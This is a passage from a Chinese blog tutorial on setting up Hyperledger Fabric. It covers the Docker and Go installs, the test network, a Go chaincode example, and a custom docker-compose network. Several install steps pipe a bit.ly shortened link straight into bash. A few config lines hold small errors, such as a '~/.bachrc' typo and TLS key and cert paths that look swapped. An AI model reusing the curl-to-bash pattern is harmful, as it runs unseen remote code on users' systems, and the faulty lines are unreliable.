|-------------------------------------------------","link":"/home/2020/10/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C-%E8%AF%B7%E6%B1%82%E8%B0%83%E9%A1%B5%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E6%96%B9%E5%BC%8F%E7%9A%84%E6%A8%A1%E6%8B%9F/"},{"title":"fabric-1.fabric环境配置与搭建","text":"参考文档-getting start 准备工作 需要安装git，curl，docker，docker compose1sudo apt install docker-compose 给当前用户运行docker的权限12345678## 创建docker组sudo groupadd docker## 将当前用户加入docker组sudo usermod -aG docker tt## 重启服务sudo service docker restart## 刷新docker成员newgrp docker go环境的安装12345678910wget https://golang.google.cn/dl/go1.19.linux-amd64.tar.gztar -zxvf go1.19.linux-amd64.tar.gzsudo mv go /usr/local/sudo tee -a ~/.bachrc &lt;&lt;-'EOF'export GOROOT=/usr/local/go## export GOPATH=/home/go/goProjectexport GOPROXY=https://goproxy.cnexport PATH=$PATH:$GOROOT/binEOFsource /etc/profile fabric的安装 fabric提供了一个脚本，用于安装二进制文件和镜像12345## 安装最新版本curl -sSL https://bit.ly/2ysbOFE | bash -s## 安装指定版本curl -sSL https://bit.ly/2ysbOFE | bash -s -- &lt;fabric_version&gt; &lt;fabric-ca_version&gt;curl -sSL https://bit.ly/2ysbOFE | bash -s -- 2.2.8 1.5.3 问题1–docker权限 我的环境中docker pull必须使用sudo，而curl并不推荐使用sudo 解决方案：先下载script，并修改，将第14行CONTAINER_CLI修改为sudo docker123curl -sSL https://bit.ly/2ysbOFE -o script.shchmod +x script.shvim script.sh 1: ${CONTAINER_CLI:=&quot;docker&quot;} ## 改为sudo docker 解决方案2：重新安装docker，发现脚本结束后，有免root运行的脚本 问题2–pull缓慢 更换镜像123456789101112131415sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'{ &quot;registry-mirrors&quot; : [ &quot;https://registry.docker-cn.com&quot;, &quot;http://hub-mirror.c.163.com&quot;, &quot;https://docker.mirrors.ustc.edu.cn&quot;, &quot;https://cr.console.aliyun.com&quot;, &quot;https://mirror.ccs.tencentyun.com&quot; ]}EOFsudo systemctl daemon-reloadsudo systemctl restart dockersudo docker info 部署一个测试网络 参考文档-Using the Fabric test network test-network在fabric-samples/test-network下 查看帮助文本1./network.sh -h 12345678910111213141516171819202122232425262728293031323334353637383940414243Using docker and docker-composeUsage: network.sh &lt;Mode&gt; [Flags] Modes: up - Bring up Fabric orderer and peer nodes. No channel is created up createChannel - Bring up fabric network with one channel createChannel - Create and join a channel after the network is created deployCC - Deploy a chaincode to a channel (defaults to asset-transfer-basic) down - Bring down the network Flags: Used with network.sh up, network.sh createChannel: -ca &lt;use CAs&gt; - Use Certificate Authorities to generate network crypto material -c &lt;channel name&gt; - Name of channel to create (defaults to &quot;mychannel&quot;) -s &lt;dbtype&gt; - Peer state database to deploy: goleveldb (default) or couchdb -r &lt;max retry&gt; - CLI times out after certain number of attempts (defaults to 5) -d &lt;delay&gt; - CLI delays for a certain number of seconds (defaults to 3) -verbose - Verbose mode Used with network.sh deployCC -c &lt;channel name&gt; - Name of channel to deploy chaincode to -ccn &lt;name&gt; - Chaincode name. -ccl &lt;language&gt; - Programming language of the chaincode to deploy: go, java, javascript, typescript -ccv &lt;version&gt; - Chaincode version. 1.0 (default), v2, version3.x, etc -ccs &lt;sequence&gt; - Chaincode definition sequence. Must be an integer, 1 (default), 2, 3, etc -ccp &lt;path&gt; - File path to the chaincode. -ccep &lt;policy&gt; - (Optional) Chaincode endorsement policy using signature policy syntax. The default policy requires an endorsement from Org1 and Org2 -cccg &lt;collection-config&gt; - (Optional) File path to private data collections configuration file -cci &lt;fcn name&gt; - (Optional) Name of chaincode initialization function. When a function is provided, the execution of init will be requested and the function will be invoked. -h - Print this message Possible Mode and flag combinations up -ca -r -d -s -verbose up createChannel -ca -c -r -d -s -verbose createChannel -c -r -d -verbose deployCC -ccn -ccl -ccv -ccs -ccp -cci -r -d -verbose Examples: network.sh up createChannel -ca -c mychannel -s couchdb network.sh createChannel -c channelName network.sh deployCC -ccn basic -ccp ../asset-transfer-basic/chaincode-javascript/ -ccl javascript network.sh deployCC -ccn mychaincode -ccp ./user/mychaincode -ccv 1 -ccl javascript 启动测试网络1./network.sh up 创建Channel channel是特定网络成员之间私有通信层，channel只能由邀请加入该channel的组织使用，并且对网络中的其他成员是不可见的。 每个channel都有一个独立的区块链账本。被邀请“加入”其同行的组织到channel来存储channel账本并验证channel上的交易。1./network.sh createChannel -c channel1 运行智能合约 在fabric中，智能合约是chainCode Chaincode安装在组织的对等端，然后部署到一个通道，然后可以使用它来批准交易，并与区块链账本交互。 1./network.sh deployCC -ccn basic -ccp ../asset-transfer-basic/chaincode-go -ccl go 这里使用了go语言的环境 -ccl指定了安装链码的语言，go/typescript/javascript -ccp指定了chainCode 销毁网络1./network.sh down 总结 测试时还有一部分是与网络交互，使用peer命令修改资产所有者等命令，测试网络有些内容还是不太清楚，运行暂时没有出错 Fabric概要 参考视频 参考博客 参考笔记 可以参考笔记中的一个思维导图进行学习 Overview Server/Backend/API Network Chain Code Ca Ledger Development process Client/Frontend/App SDK Development process Samples ServerNetwork是一个p2p网络，由两部分组成 Peer Container，对等节点 Endorser，背书节点，根据背书策略对交易进行验证 Committer，提交节点，chainCode不会部署在Endorser之上，而是Committer上 集群管理 Kubernates Orderer Container，排序节点 Ca客户端服务端配合实现动态授予证书，支持实时添加对等节点数量 Ledger BlockChain：TX记录，存储交易 channel，同一通道具有（可见）同一个公共账本 Hash pointer，支持哈希指针 Hashed linkList，支持哈希链表 State DB：World/Current State，状态数据库 A peer，A DB 存储交易的Index Single/No-SQL – key value存储，HTTP Api，通过http请求获得数据，段康康5984 level DB，默认引擎，k-v存储 Couch DB，数据库引擎，k-v存储，json存储 顺序读写能力强，随机读取能力若 Chain Code System Chain Code 包括CSCC等，可以自定义 创建时随peer一起启动，用于peer节点（而不是channel）上，只支持go User Chain Code 用于操纵资产，提供操纵资产的接口 具有生命周期，初始化-部署-实例化-调用 运行于peer上的容器中 支持语言 Golang语言层面支持并发，适合服务端应用开发 Node Java Client/Frontend/App 操作区块链网络，部署、执行 Chain code 提供的接口函数，监听网络事件，接收区块信息，写入交易等等 SDK Node(推荐使用) TypeScript Golang Python Java Architecture 知识补充–Node.js 简单的说 Node.js 就是运行在服务端的 JavaScript。 创建Node.js应用123456789101112131415var http = require('http');http.createServer(function (request, response) { // 发送 HTTP 头部 // HTTP 状态值: 200 : OK // 内容类型: text/plain response.writeHead(200, {'Content-Type': 'text/plain'}); // 发送响应数据 &quot;Hello World&quot; response.end('Hello World\\n');}).listen(8888);// 终端打印如下信息console.log('Server running at http://127.0.0.1:8888/'); require函数载入http模块 createServer创建服务器 listen指定监听端口 使用node命令运行，访问8888端口 使用node命令运行1node server.js npm命令 npm安装模块1npm install xxxx 安装好之后，express 包就放在了工程目录下的 node_modules 目录中，因此在代码中只需要通过 require(‘express’) 的方式就好，无需指定第三方包路径。 -g参数指定全局安装，即将安装包放在 /usr/local 下或者你 node 的安装目录。 pacjage.json 用于定义包的属性 name - 包名。 version - 包的版本号。 description - 包的描述。 homepage - 包的官网 url 。 author - 包的作者姓名。 contributors - 包的其他贡献者姓名。 dependencies - 依赖包列表。如果依赖包没有安装，npm 会自动将依赖包安装在 node_module 目录下。 repository - 包代码存放的地方的类型，可以是 git 或 svn，git 可在 Github 上。 main - main 字段指定了程序的主入口文件，require(‘moduleName’) 就会加载这个文件。这个字段的默认值是模块根目录下面的 index.js。 keywords - 关键字 还可以使用npm init npm adduser npm publish发布自己的模块，使用npm unpublish取消发布模块 REPL Read Eval Print Loop，交互式解释器，类似python的IDLE，可以输入代码并获得执行结果 通过node命令进入，快捷键ctrl c退出。 Hellow World 参考教程编写你的第一个应用 具体内容 启动网络 使用Node登记管理员用户，注册和登记应用程序用户，查询账本，更新账本 清除数据 startFabric.sh12345pushd ../test-network./network.sh down./network.sh up createChannel -ca -s couchdb./network.sh deployCC -ccn fabcar -ccv 1 -cci initLedger -ccl ${CC_SRC_LANGUAGE} -ccp ${CC_SRC_PATH}popd 事实上就是启动test-network，创建两个peer节点和channel，再部署链码 chaincode api sdk有go，java和未正式发布的python 开发一个ChainCode（go）创建struct123456789101112package mainimport ( &quot;fmt&quot; &quot;github.com/hyperledger/fabric-chaincode-go/shim&quot; &quot;github.com/hyperledger/fabric-protos-go/peer&quot;)// SimpleAsset implements a simple chaincode to manage an assettype SimpleAsset struct {} 实现init方法1234567891011121314151617181920// Init is called during chaincode instantiation to initialize any// data. Note that chaincode upgrade also calls this function to reset// or to migrate data, so be careful to avoid a scenario where you// inadvertently clobber your ledger's data!func (t *SimpleAsset) Init(stub shim.ChaincodeStubInterface) peer.Response { // Get the args from the transaction proposal args := stub.GetStringArgs() if len(args) != 2 { return shim.Error(&quot;Incorrect arguments. Expecting a key and a value&quot;) } // Set up any variables or assets here by calling stub.PutState() // We store the key and the value on the ledger err := stub.PutState(args[0], []byte(args[1])) if err != nil { return shim.Error(fmt.Sprintf(&quot;Failed to create asset: %s&quot;, args[0])) } return shim.Success(nil)} 验证 init方法可以是空 实现invoke函数123456789101112131415161718192021// Invoke is called per transaction on the chaincode. Each transaction is// either a 'get' or a 'set' on the asset created by Init function. The Set// method may create a new asset by specifying a new key-value pair.func (t *SimpleAsset) Invoke(stub shim.ChaincodeStubInterface) peer.Response { // Extract the function and args from the transaction proposal fn, args := stub.GetFunctionAndParameters() var result string var err error if fn == &quot;set&quot; { result, err = set(stub, args) } else { result, err = get(stub, args) } if err != nil { return shim.Error(err.Error()) } // Return the result as success payload return shim.Success([]byte(result))} 根据stub中的参数，调用get或set方法，并返回结果 实现get和set1234567891011121314151617181920212223242526272829// Set stores the asset (both key and value) on the ledger. If the key exists,// it will override the value with the new onefunc set(stub shim.ChaincodeStubInterface, args []string) (string, error) { if len(args) != 2 { return &quot;&quot;, fmt.Errorf(&quot;Incorrect arguments. Expecting a key and a value&quot;) } err := stub.PutState(args[0], []byte(args[1])) if err != nil { return &quot;&quot;, fmt.Errorf(&quot;Failed to set asset: %s&quot;, args[0]) } return args[1], nil}// Get returns the value of the specified asset keyfunc get(stub shim.ChaincodeStubInterface, args []string) (string, error) { if len(args) != 1 { return &quot;&quot;, fmt.Errorf(&quot;Incorrect arguments. Expecting a key&quot;) } value, err := stub.GetState(args[0]) if err != nil { return &quot;&quot;, fmt.Errorf(&quot;Failed to get asset: %s with error: %s&quot;, args[0], err) } if value == nil { return &quot;&quot;, fmt.Errorf(&quot;Asset not found: %s&quot;, args[0]) } return string(value), nil} 从ledger账本中读写数据 实现main方法12345func main() { if err := shim.Start(new(SimpleAsset)); err != nil { fmt.Printf(&quot;Error starting SimpleAsset chaincode: %s&quot;, err) }} 在以上步骤的基础上，结合shim api应该可以开发出其他功能","link":"/home/2022/10/22/fedfab/fabric/1.fabric%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%90%AD%E5%BB%BA/"},{"title":"fabric-2.fabric自定义与实践","text":"手动搭建hyperledger fabric v2.x，其中第二个视频中，创建组织的锚节点文件已经被弃用 命令参考 计划配置一个4个节点的网络，三个节点模拟IOT设备，一个代表公司节点 主要工作 创建了一个拥有两个org的通道 自定义了一个网络，org1拥有三个节点，org2拥有1个节点 用go语言自定义了chaincode并编译 在网络上安装通道，执行链码 fabric环境变量 为了使用cryptogen等工具123cd fabric-samples/binsudo echo export PATH=\\$PATH:$(pwd) &gt;&gt; ~/.bashrcsource ~/.bashrc 创建节点目录，使用cryptogen命令cryptogen 有如下五个子命令: help generate showtemplate extend version 创建模板文件1cryptogen showtemplate &gt; crypto-config.yaml 修改模板排序节点12345678910111213141516## ---------------------------------------------------------------------------## &quot;OrdererOrgs&quot; - Definition of organizations managing orderer nodes## ---------------------------------------------------------------------------OrdererOrgs: ## --------------------------------------------------------------------------- ## Orderer ## --------------------------------------------------------------------------- - Name: Orderer Domain: fedfab.com EnableNodeOUs: false ## --------------------------------------------------------------------------- ## &quot;Specs&quot; - See PeerOrgs below for complete description ## --------------------------------------------------------------------------- Specs: - Hostname: orderer EnableNodeOUs，即是否启用Organization Unit peer节点（组织1）123456789101112131415PeerOrgs: ## --------------------------------------------------------------------------- ## Org1 ## --------------------------------------------------------------------------- - Name: Org1 Domain: org1.fedfab.com EnableNodeOUs: false #这里改为true Template: Count: 1 ## 这里改为3. ## Start: 5 ## Hostname: {{.Prefix}}{{.Index}} ## default ## SANS: ## - &quot;{{.Hostname}}.alt.{{.Domain}}&quot; Users: Count: 1 #这里也改为3 User指操纵终端的人，在终端操纵的人 peer节点（组织2）12345678910#---------------------------------------------------------------------------## Org2: See &quot;Org1&quot; for full specification## ---------------------------------------------------------------------------- Name: Org2 Domain: org2.fedfab.com EnableNodeOUs: false #改成true Template: Count: 1 Users: Count: 1 生成证书文件1cryptogen generate --config=crypto-config.yaml 输出，并创建了证书文件12org1.fedfab.comorg2.fedfab.com 进入一个组织查看12tt@tt-HP:~/Desktop/fabric/my-network/nodes/crypto-config/peerOrganizations/org1.fedfab.com$ lsca msp peers tlsca users 创建通道 编写configtx.yaml配置文件 使用configtxgen命令创建通道 configtxgen的使用 configtxgen 工具没有子命令，但是支持flag，通过设置flag可以完成不同的任务。12345678910111213141516171819202122232425Usage of configtxgen: -asOrg string 以特定组织（按名称）执行配置生成，仅包括组织（可能）有权设置的写集中的值。 -channelCreateTxBaseProfile string 指定要视为排序系统通道当前状态的轮廓（profile），以允许在通道创建交易生成期间修改非应用程序参数。仅在与 “outputCreateChannelTX” 结合时有效。 -channelID string 配置交易中使用的通道 ID。 -configPath string 包含所用的配置的路径。（如果设置的话） -inspectBlock string 打印指定路径的区块中包含的配置。 -inspectChannelCreateTx string 打印指定路径的交易中包含的配置。 -outputAnchorPeersUpdate string 创建一个更新锚节点的配置更新（仅在默认通道创建时有效，并仅用于第一次更新）。 -outputBlock string 写入创世区块的路径。（如果设置的话） -outputCreateChannelTx string 写入通道创建交易的路径。（如果设置的话） -printOrg string 以 JSON 方式打印组织的定义。（手动向通道中添加组织时很有用） -profile string configtx.yaml 中用于生成的轮廓。 -version 显示版本信息。 configtx.yaml的编写官方文档在创建新通道中详细介绍了configtx.yaml的写法 这里我直接复制test-network中的配置文件并进行相应修改 创建configtx文件夹1mkdir configtx 修改配置文件 修改msp文件地址将配置文件中的MSPDir-msp地址修改为在生成证书文件步骤中生成的文件的目录 修改证书地址将配置文件中的ClientTLSCert和ServerTLSCert修改为在生成证书文件步骤中生成的文件的目录 写入创世块的配置文件 12345678910111213TwoOrgsOrdererGenesis: &lt;&lt;: *ChannelDefaults Orderer: &lt;&lt;: *OrdererDefaults Organizations: - *OrdererOrg Capabilities: &lt;&lt;: *OrdererCapabilities Consortiums: SampleConsortium: Organizations: - *Org1 - *Org2 编写yaml文件时要注意缩进，否则将导致执行失败 写入创建应用通道的配置 12345678910TwoOrgsChannel: Consortium: SampleConsortium &lt;&lt;: *ChannelDefaults Application: &lt;&lt;: *ApplicationDefaults Organizations: - *Org1 - *Org2 Capabilities: &lt;&lt;: ***ApplicationCapabilities** 创建环境变量1export FABRIC_CFG_PATH=${PWD}/configtx 创建创世块1configtxgen -profile TwoOrgsOrdererGenesis -channelID system-channel -outputBlock ./system-genesis-block/genesis.block 得到输出 12345672022-08-27 20:52:53.432 CST 0001 INFO [common.tools.configtxgen] main -&gt; Loading configuration2022-08-27 20:52:53.441 CST 0002 INFO [common.tools.configtxgen.localconfig] completeInitialization -&gt; orderer type: etcdraft2022-08-27 20:52:53.441 CST 0003 INFO [common.tools.configtxgen.localconfig] completeInitialization -&gt; Orderer.EtcdRaft.Options unset, setting to tick_interval:&quot;500ms&quot; election_tick:10 heartbeat_tick:1 max_inflight_blocks:5 snapshot_interval_size:16777216 2022-08-27 20:52:53.441 CST 0004 INFO [common.tools.configtxgen.localconfig] Load -&gt; Loaded configuration: /home/tt/Desktop/fabric/my-network/nodes/configtx/configtx.yaml2022-08-27 20:52:53.443 CST 0005 INFO [common.tools.configtxgen] doOutputBlock -&gt; Generating genesis block2022-08-27 20:52:53.443 CST 0006 INFO [common.tools.configtxgen] doOutputBlock -&gt; Creating system channel genesis block2022-08-27 20:52:53.443 CST 0007 INFO [common.tools.configtxgen] doOutputBlock -&gt; Writing genesis block 创建应用通道123configtxgen -profile TwoOrgsChannel -outputCreateChannelTx ./channel-artifacts/channel2.tx -channelID channel2configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/Org1MSPanchors.tx -channelID channel2 -asOrg Org1MSPconfigtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/Org2MSPanchors.tx -channelID channel2 -asOrg Org2MSP 得到输出 12342022-08-27 21:01:01.223 CST 0001 INFO [common.tools.configtxgen] main -&gt; Loading configuration2022-08-27 21:01:01.233 CST 0002 INFO [common.tools.configtxgen.localconfig] Load -&gt; Loaded configuration: /home/tt/Desktop/fabric/my-network/nodes/configtx/configtx.yaml2022-08-27 21:01:01.233 CST 0003 INFO [common.tools.configtxgen] doOutputChannelCreateTx -&gt; Generating new channel configtx2022-08-27 21:01:01.235 CST 0004 INFO [common.tools.configtxgen] doOutputChannelCreateTx -&gt; Writing new channel tx 创建peer节点和order节点 使用docker compose对节点容器进行定义 在test-network的基础上进行修改 修改order节点1234567891011121314151617181920212223242526272829303132333435363738394041424344orderer.fedfab.com: container_name: orderer.fedfab.com image: hyperledger/fabric-orderer:latest labels: service: hyperledger-fabric environment: - FABRIC_LOGGING_SPEC=INFO - ORDERER_GENERAL_LISTENADDRESS=0.0.0.0 - ORDERER_GENERAL_LISTENPORT=7050 - ORDERER_GENERAL_LOCALMSPID=OrdererMSP - ORDERER_GENERAL_LOCALMSPDIR=/var/hyperledger/orderer/msp ## enabled TLS - ORDERER_GENERAL_TLS_ENABLED=true - ORDERER_GENERAL_TLS_PRIVATEKEY=/var/hyperledger/orderer/tls/server.key - ORDERER_GENERAL_TLS_CERTIFICATE=/var/hyperledger/orderer/tls/server.crt - ORDERER_GENERAL_TLS_ROOTCAS=[/var/hyperledger/orderer/tls/ca.crt] - ORDERER_GENERAL_CLUSTER_CLIENTCERTIFICATE=/var/hyperledger/orderer/tls/server.crt - ORDERER_GENERAL_CLUSTER_CLIENTPRIVATEKEY=/var/hyperledger/orderer/tls/server.key - ORDERER_GENERAL_CLUSTER_ROOTCAS=[/var/hyperledger/orderer/tls/ca.crt] ## - ORDERER_GENERAL_BOOTSTRAPMETHOD=none #去掉 - ORDERER_GENERAL_GENESISMETHOD=file #增加 - ORDERER_GENERAL_GENESISFILE=/var/hyperledger/orderer/system-genesis-block/genesis.block #增加 - ORDERER_CHANNELPARTICIPATION_ENABLED=true - ORDERER_ADMIN_TLS_ENABLED=true - ORDERER_ADMIN_TLS_CERTIFICATE=/var/hyperledger/orderer/tls/server.crt - ORDERER_ADMIN_TLS_PRIVATEKEY=/var/hyperledger/orderer/tls/server.key - ORDERER_ADMIN_TLS_ROOTCAS=[/var/hyperledger/orderer/tls/ca.crt] - ORDERER_ADMIN_TLS_CLIENTROOTCAS=[/var/hyperledger/orderer/tls/ca.crt] - ORDERER_ADMIN_LISTENADDRESS=0.0.0.0:7053 - ORDERER_OPERATIONS_LISTENADDRESS=orderer.fedfab.com:9443 - ORDERER_METRICS_PROVIDER=prometheus working_dir: /root command: orderer volumes: - ../crypto-config/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp:/var/hyperledger/orderer/msp - ../crypto-config/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/tls/:/var/hyperledger/orderer/tls - ../system-genesis-block/:/var/hyperledger/orderer/system-genesis-block #增加 - orderer.fedfab.com:/var/hyperledger/production/orderer ports: - 7050:7050 - 7053:7053 - 9443:9443 networks: - test 后续会手动生成创世块，需要在compose中指定生成的创世块 增加节点个数 test-network中只有三个节点（排序和两个peer节点），现在修改为1排序+3org1+1org2 123456volumes: orderer.fedfab.com: peer0.org1.fedfab.com: peer1.org1.fedfab.com: peer2.org1.fedfab.com: peer0.org2.fedfab.com: 增加org1中的节点配置，以下面的配置文件为模板1234567891011121314151617181920212223242526272829303132333435363738peer0.org1.fedfab.com: #修改 container_name: peer0.org1.fedfab.com #修改 image: hyperledger/fabric-peer:latest labels: service: hyperledger-fabric environment: - FABRIC_CFG_PATH=/etc/hyperledger/peercfg - FABRIC_LOGGING_SPEC=INFO #- FABRIC_LOGGING_SPEC=DEBUG - CORE_PEER_TLS_ENABLED=true - CORE_PEER_PROFILE_ENABLED=false - CORE_PEER_TLS_CERT_FILE=/etc/hyperledger/fabric/tls/server.crt - CORE_PEER_TLS_KEY_FILE=/etc/hyperledger/fabric/tls/server.key - CORE_PEER_TLS_ROOTCERT_FILE=/etc/hyperledger/fabric/tls/ca.crt ## Peer specific variables - CORE_PEER_ID=peer0.org1.fedfab.com #修改 - CORE_PEER_ADDRESS=peer0.org1.fedfab.com:7051 #修改 - CORE_PEER_LISTENADDRESS=0.0.0.0:7051 - CORE_PEER_CHAINCODEADDRESS=peer0.org1.fedfab.com:7052 #修改 - CORE_PEER_CHAINCODELISTENADDRESS=0.0.0.0:7052 - CORE_PEER_GOSSIP_BOOTSTRAP=peer0.org1.fedfab.com:7051 #修改 - CORE_PEER_GOSSIP_EXTERNALENDPOINT=peer0.org1.fedfab.com:7051 - CORE_PEER_LOCALMSPID=Org1MSP - CORE_PEER_MSPCONFIGPATH=/etc/hyperledger/fabric/msp - CORE_OPERATIONS_LISTENADDRESS=peer0.org1.fedfab.com:9444 #修改 - CORE_METRICS_PROVIDER=prometheus - CHAINCODE_AS_A_SERVICE_BUILDER_CONFIG={&quot;peername&quot;:&quot;peer0org1&quot;} #修改 - CORE_CHAINCODE_EXECUTETIMEOUT=300s volumes: - ../organizations/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com:/etc/hyperledger/fabric #修改 - peer0.org1.fedfab.com:/var/hyperledger/production #修改 working_dir: /root command: peer node start ports: - 7051:7051 #修改 - 9444:9444 #修改 networks: - test 修改容器的文件夹映射 将tls，mse等路径，域名名称修改正确 修改端口号 编号 端口配置 orderer.fedfab.com 7050:7050, 7053:7053, 9443:9443 peer0.org1.fedfab.com 8051:7051, 9444:9444 peer1.org1.fedfab.com 8052:7051, 9445:9444 peer2.org1.fedfab.com 8053:7051, 9446:9444 peer0.org2.fedfab.com 9051:7051, 9447:9444 CLI（命令行接口）配置 为每个节点创建一个cli 参考官方的cli配置教程，cli需要以下环境变量123456export FABRIC_CFG_PATH=$PWD/../config/export CORE_PEER_TLS_ENABLED=trueexport CORE_PEER_LOCALMSPID=&quot;Org1MSP&quot;export CORE_PEER_TLS_ROOTCERT_FILE=${PWD}/organizations/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crtexport CORE_PEER_MSPCONFIGPATH=${PWD}/organizations/peerOrganizations/org1.fedfab.com/users/Admin@org1.fedfab.com/mspexport CORE_PEER_ADDRESS=localhost:7051 根据上述环境变量和test-network中的cli配置，编写四个节点的cli123456789101112131415161718192021222324252627282930313233cli1: #修改 container_name: cli1 #修改 image: hyperledger/fabric-tools:latest labels: service: hyperledger-fabric tty: true stdin_open: true environment: - GOPATH=/opt/gopath - FABRIC_LOGGING_SPEC=INFO - FABRIC_CFG_PATH=/etc/hyperledger/peercfg #- FABRIC_LOGGING_SPEC=DEBUG - CORE_PEER_ID=cli1 #修改 - CORE_PEER_TLS_ENABLED=true - CORE_PEER_LOCALMSPID=Org1MSP #修改 - CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/server.crt #修改 - CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/server.key #修改 - CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crt #修改 - CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/users/Admin@org1.fedfab.com/msp #修改 - CORE_PEER_ADDRESS=peer0.org1.fedfab.com:8051 #修改 working_dir: /opt/gopath/src/github.com/hyperledger/fabric/peer command: /bin/bash volumes: - ../crypto-config:/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto - ../scripts:/opt/gopath/src/github.com/hyperledger/fabric/peer/scripts/ - /var/run/:/host/var/run/ - ../chaincode/go/:/opt/gopath/src/github.com/hyperledger/fabric-cluster/chaincode/go - ../channel-artifacts:/opt/gopath/src/github.com/hyperledger/fabric/peer/channel-artifacts - ./docker/peercfg:/etc/hyperledger/peercfg depends_on: - peer0.org1.fedfab.com #修改 networks: - test 运行1docker-compose up -d 得到输出 123456789101112131415Creating network &quot;fabric_test&quot; with the default driverCreating volume &quot;compose_orderer.fedfab.com&quot; with default driverCreating volume &quot;compose_peer0.org1.fedfab.com&quot; with default driverCreating volume &quot;compose_peer1.org1.fedfab.com&quot; with default driverCreating volume &quot;compose_peer2.org1.fedfab.com&quot; with default driverCreating volume &quot;compose_peer0.org2.fedfab.com&quot; with default driverCreating peer0.org1.fedfab.com ... doneCreating peer0.org2.fedfab.com ... doneCreating peer1.org1.fedfab.com ... doneCreating peer2.org1.fedfab.com ... doneCreating orderer.fedfab.com ... doneCreating cli0 ... doneCreating cli3 ... doneCreating cli1 ... doneCreating cli2 ... done 验证容器是否启动1docker ps -a 12345678910CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd6a76f883fff hyperledger/fabric-tools:latest &quot;/bin/bash&quot; 3 seconds ago Up 2 seconds cli377b3a4f45dd7 hyperledger/fabric-tools:latest &quot;/bin/bash&quot; 3 seconds ago Up 2 seconds cli1cc967bbbffbc hyperledger/fabric-tools:latest &quot;/bin/bash&quot; 3 seconds ago Up 2 seconds cli24cac839a509e hyperledger/fabric-tools:latest &quot;/bin/bash&quot; 4 seconds ago Up 2 seconds cli0dd8fb44841ed hyperledger/fabric-peer:latest &quot;peer node start&quot; 4 seconds ago Exited (1) 2 seconds ago peer1.org1.fedfab.com37d044dc815b hyperledger/fabric-peer:latest &quot;peer node start&quot; 4 seconds ago Exited (1) 3 seconds ago peer2.org1.fedfab.comc5d9572fd1b0 hyperledger/fabric-peer:latest &quot;peer node start&quot; 4 seconds ago Exited (1) 2 seconds ago peer0.org2.fedfab.comfa43da3532d7 hyperledger/fabric-orderer:latest &quot;orderer&quot; 4 seconds ago Up 3 seconds 0.0.0.0:7050-&gt;7050/tcp, :::7050-&gt;7050/tcp, 0.0.0.0:7053-&gt;7053/tcp, :::7053-&gt;7053/tcp, 0.0.0.0:9443-&gt;9443/tcp, :::9443-&gt;9443/tcp orderer.fedfab.com45b71846f669 hyperledger/fabric-peer:latest &quot;peer node start&quot; 4 seconds ago Exited (1) 3 seconds ago peer0.org1.fedfab.com 使用logs命令查看日志 12docker logs peer0.org1.fedfab.com2022-08-28 11:18:05.811 UTC 0001 ERRO [main] InitCmd -&gt; Fatal error when initializing core config : FABRIC_CFG_PATH /etc/hyperledger/peercfg does not exist 根据docker hub - fabric-peer的描述，在FABRIC_CFG_PATH下需要有core.yaml文件 复制一份test-network的core.yaml到compose文件夹下 在peer节点中添加映射 1- ./docker/peercfg:/etc/hyperledger/peercfg 再次尝试创建容器，并使用ps命令验证 12345678910CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESeaa7a6ad0dc4 hyperledger/fabric-tools:latest &quot;/bin/bash&quot; 4 seconds ago Up 3 seconds cli36cfcf59846eb hyperledger/fabric-tools:latest &quot;/bin/bash&quot; 5 seconds ago Up 3 seconds cli229fe65400204 hyperledger/fabric-tools:latest &quot;/bin/bash&quot; 5 seconds ago Up 3 seconds cli14ac9037d3c2c hyperledger/fabric-tools:latest &quot;/bin/bash&quot; 5 seconds ago Up 4 seconds cli0a5e90a5b170a hyperledger/fabric-peer:latest &quot;peer node start&quot; 5 seconds ago Up 4 seconds 7051/tcp, 0.0.0.0:9051-&gt;9051/tcp, :::9051-&gt;9051/tcp, 0.0.0.0:9447-&gt;9445/tcp, :::9447-&gt;9445/tcp peer0.org2.fedfab.com9b3b0f6445d2 hyperledger/fabric-peer:latest &quot;peer node start&quot; 5 seconds ago Up 4 seconds 0.0.0.0:9444-&gt;9444/tcp, :::9444-&gt;9444/tcp, 0.0.0.0:8051-&gt;7051/tcp, :::8051-&gt;7051/tcp peer0.org1.fedfab.com5d75a82337c8 hyperledger/fabric-peer:latest &quot;peer node start&quot; 5 seconds ago Up 4 seconds 0.0.0.0:8052-&gt;7051/tcp, :::8052-&gt;7051/tcp, 0.0.0.0:9445-&gt;9444/tcp, :::9445-&gt;9444/tcp peer1.org1.fedfab.com5eb7a92eb4e0 hyperledger/fabric-orderer:latest &quot;orderer&quot; 5 seconds ago Up 4 seconds 0.0.0.0:7050-&gt;7050/tcp, :::7050-&gt;7050/tcp, 0.0.0.0:7053-&gt;7053/tcp, :::7053-&gt;7053/tcp, 0.0.0.0:9443-&gt;9443/tcp, :::9443-&gt;9443/tcp orderer.fedfab.com17c6798b2dc9 hyperledger/fabric-peer:latest &quot;peer node start&quot; 5 seconds ago Up 4 seconds 0.0.0.0:8053-&gt;7051/tcp, :::8053-&gt;7051/tcp, 0.0.0.0:9446-&gt;9444/tcp, :::9446-&gt;9444/tcp peer2.org1.fedfab.com 全部容器都已经启动成功！ 补充 